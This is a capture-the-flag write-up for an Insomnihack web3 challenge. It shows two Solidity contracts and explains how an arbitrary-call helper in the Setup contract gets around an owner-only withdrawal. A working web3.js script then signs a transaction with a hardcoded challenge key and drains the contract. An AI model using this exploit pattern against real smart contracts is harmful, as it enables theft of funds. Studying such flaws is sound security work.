# NotSuchSolidIT - web3

## Challenge

We get one challenge contract and its address, and want to get all value of it out of the contract. We also receive a address (including private key) on the chain which we can use to sign transactions.

### Challenge.sol

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;
contract Challenge {

	address payable owner;
    
	constructor() payable {
		owner = payable(msg.sender); 
	}

	modifier onlyOwner {
		require(msg.sender == owner);
		_;
	}
	
	function getBalance() public view returns (uint){
		return address(this).balance;
	}
	
	function withdrawAll(address payable _to) public onlyOwner {
		_to.transfer(address(this).balance);
	}
	
	function destroy() public onlyOwner {
		selfdestruct(owner);
	}
}
```

### Setup.sol

We also get the setup contract that was used ot deploy the chall, as well as it's address.

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.1;
import "./Challenge.sol";

contract Setup {
	Challenge public chall;

	constructor() payable {
		require(msg.value >= 100, "Not enough ETH to create the challenge..");
		chall = (new Challenge){ value: 50 ether }();
	}

	function isSolved() public view returns (bool) {
		return address(chall).balance == 0;
	}
	
	function isAlive(string calldata signature, bytes calldata parameters, address addr) external returns(bytes memory) {
		(bool success, bytes memory data) = address(addr).call(
			abi.encodeWithSelector(
				bytes4(keccak256(bytes(signature))),
				parameters
			)
		);
		require(success, 'Call failed');
		return data;
	}
}

```


## Solution

Here the contract by itself is pretty ok. The vulnerability lies in the setup contract being able to execute functions of the challenge contract, using the isAlive() function. As the withdrawAll() only checks for the msg.sender being the owner, which the setup contract is, it can be used to call the function via the setup contract. Below this you can see an example script that exploits this vulnerability.


```
const Web3 = require('web3');
const setupContractAbi = require('./abi_setup.json');

async function sendTransaction() {
  // create a web3 instance
  const web3 = new Web3('https://notsuchsolidit.insomnihack.ch:32833');

  // create a contract instance for the setup contract
  const setupContractAddress = '0x876807312079af775c49c916856A2D65f904e612';
  const setupContract = new web3.eth.Contract(setupContractAbi, setupContractAddress);

  // define the function to call
  const signature = 'withdrawAll(address)';
  const parameters = Buffer.from('133756e1688E475c401d1569565e8E16E65B1337', 'hex');
  const addr = '0x874f54e755ec1e2a9ea083bd6d9c89148cea34d4';
  const functionToCallabi = setupContract.methods.isAlive(signature, parameters, addr).encodeABI();

  // sign the transaction
  const privateKey = 'edbc6d1a8360d0c02d4063cdd0a23b55c469c90d3cfbc2c88a015f9dd92d22b3';
  const fromAddress = '0x133756e1688E475c401d1569565e8E16E65B1337';
  const nonce = await web3.eth.getTransactionCount(fromAddress);
  const gasPrice = await web3.eth.getGasPrice();
  const gasLimit = 1000000;
  const txObject = {
    from: fromAddress,
    to: setupContractAddress,
    gas: gasLimit,
    gasPrice: gasPrice,
    nonce: nonce,
    data: functionToCallabi,
  };
  const signedTx = await web3.eth.accounts.signTransaction(txObject, privateKey);
  const serializedTx = signedTx.rawTransaction;

  // send the transaction
  const receipt = await web3.eth.sendSignedTransaction(serializedTx);
  console.log('Transaction hash:', receipt.transactionHash);
}

sendTransaction();
```

Now you just need to run this script 

--> Flag